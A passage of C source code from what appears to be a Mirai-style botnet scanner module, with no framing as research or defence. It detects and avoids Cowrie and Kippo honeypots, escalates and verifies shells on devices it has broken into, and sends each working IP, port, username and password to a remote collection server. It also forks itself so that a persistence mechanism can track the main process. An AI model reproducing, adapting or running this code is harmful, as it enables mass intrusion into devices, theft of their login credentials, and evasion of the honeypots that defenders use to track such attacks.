                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "svr04", 5) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "server04", 8) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "Welcome to Ubuntu 14.04.1", 25) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "Debian GNU/Linux 7", 18) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "kippo", 5) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "cowrie", 6) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "nanocore", 8) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "heralding", 9) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "phil@PC", 7) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "richard@PC", 10) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "from 127.0.0.1", 14) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "honeypot", 8) != -1) {
                                    SCAN_DBG("FD%d " IP_ARGS " HONEYPOT (Cowrie/Kippo sig in MOTD)",
                                             conn->fd, IP_FMT(conn->dst_addr));
                                    close(conn->fd);
                                    conn->fd = -1;
                                    conn->state = SC_CLOSED;
                                    break;
                                }
                                /* Verify shell — echo token test */
                                SCAN_DBG("FD%d " IP_ARGS " got prompt, verifying shell",
                                         conn->fd, IP_FMT(conn->dst_addr));
                                send(conn->fd, "echo -n xQ4w\r\n", 14, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;

                        case SC_WAITING_ENABLE_RESP:
                            /* We sent 'cat /proc/mounts || echo xQ4w' to verify shell.
                             * If we got >10 chars of output or our token, shell is real.
                             * If not, escalate (enable/system/shell/sh) and retry. */
                            if ((consumed = scan_consume_any_prompt(conn)) > 0) {
                                if (scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "xQ4w", 4) != -1) {
                                    /* Shell verified — probe PID 1 + honeypot dirs */
                                    SCAN_DBG("FD%d " IP_ARGS " shell verified, probing PID1",
                                             conn->fd, IP_FMT(conn->dst_addr));
                                    send(conn->fd,
                                        "cat /proc/1/cmdline 2>/dev/null; echo ---;"
                                        " ls /opt/cowrie /home/cowrie /home/kippo 2>/dev/null\r\n",
                                        96, MSG_NOSIGNAL);
                                    conn->state = SC_WAITING_PROBE_RESP;
                                } else {
                                    /* Verify failed — try escalation chain then re-verify */
                                    SCAN_DBG("FD%d " IP_ARGS " verify failed, escalating",
                                             conn->fd, IP_FMT(conn->dst_addr));
                                    send(conn->fd, "enable\r\nsystem\r\nshell\r\nsh\r\n", 26, MSG_NOSIGNAL);
                                    send(conn->fd, "echo -n xQ4w\r\n", 14, MSG_NOSIGNAL);
                                    /* Re-verify after escalation */
                                    conn->state = SC_WAITING_ENABLE_RESP;
                                }
                            }
                            break;

                        case SC_WAITING_PROBE_RESP:
                            if ((consumed = scan_consume_any_prompt(conn)) > 0) {
                                if (scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "twisted", 7) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "cowrie", 6) != -1 ||
                                    scan_memsearch(conn->rdbuf, conn->rdbuf_pos, "/home/kippo", 11) != -1) {
                                    SCAN_DBG("FD%d " IP_ARGS " HONEYPOT (probe: PID1/dirs)",
                                             conn->fd, IP_FMT(conn->dst_addr));
                                    close(conn->fd);
                                    conn->fd    = -1;
                                    conn->state = SC_CLOSED;
                                } else {
                                    /* All checks passed — report credentials */
                                    uint32_t ip = conn->dst_addr;
                                    char fbuf[256];
                                    int sent_ok = 0;
                                    snprintf(fbuf, sizeof(fbuf),
                                        "%d.%d.%d.%d:%d %s:%s\n",
                                        ip & 0xff, (ip >> 8) & 0xff,
                                        (ip >> 16) & 0xff, (ip >> 24) & 0xff,
                                        ntohs(conn->dst_port),
                                        conn->auth->username, conn->auth->password);
                                    SCAN_DBG("FD%d " IP_ARGS ":%d VERIFIED %s:%s (mounts clean)",
                                             conn->fd, IP_FMT(ip), ntohs(conn->dst_port),
                                             conn->auth->username, conn->auth->password);
                                    scan_srv_alive();
                                    if (g_scan_srv_fd < 0 && scan_host[0] && scan_port > 0) {
                                        SCAN_DBG("Reconnecting to scan server %s:%d ...", scan_host, scan_port);
                                        g_scan_srv_fd = scan_srv_connect(scan_host, scan_port);
                                        if (g_scan_srv_fd >= 0)
                                            SCAN_DBG("Scan server reconnected (fd=%d)", g_scan_srv_fd);
                                    }
                                    if (g_scan_srv_fd >= 0) {
                                        scan_srv_send(fbuf);
                                        if (g_scan_srv_fd >= 0)
                                            sent_ok = 1;
                                    }
                                    SCAN_DBG("Report %s: %.*s",
                                             sent_ok ? "SENT" : "DROPPED (no scan server)",
                                             (int)(strlen(fbuf) - 1), fbuf);

                                    close(conn->fd);
                                    conn->fd    = -1;
                                    conn->state = SC_CLOSED;
                                }
                            }
                            break;

                        default:
                            consumed = 0;
                            break;
                        }

                        if (consumed == 0)
                            break;

                        if (consumed > conn->rdbuf_pos)
                            consumed = conn->rdbuf_pos;
                        conn->rdbuf_pos -= consumed;
                        memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    }
                }
            }
        }
    }
}

/* ==================================================================
 * PUBLIC API
 * ================================================================== */

void scanner_init(const char *scan_srv_addr)
{
    if (g_scanner_running)
        return;

    g_scan_pid = fork();
    if (g_scan_pid == -1)
        return;

    if (g_scan_pid == 0) {
        /* Child -- release control port so persistence detects main process death */
        if (g_ctrl_fd >= 0) { close(g_ctrl_fd); g_ctrl_fd = -1; }
        /* Child -- run scanner, report to scan server */
        scan_child_main(scan_srv_addr);
        _exit(0); /* unreachable */
    }

    /* Parent */
    g_scanner_running = 1;
}

void scanner_kill(void)
{
    if (!g_scanner_running || g_scan_pid <= 0)
        return;

    kill(g_scan_pid, SIGKILL);
    waitpid(g_scan_pid, NULL, 0);
    g_scan_pid        = -1;
    g_scanner_running = 0;
}

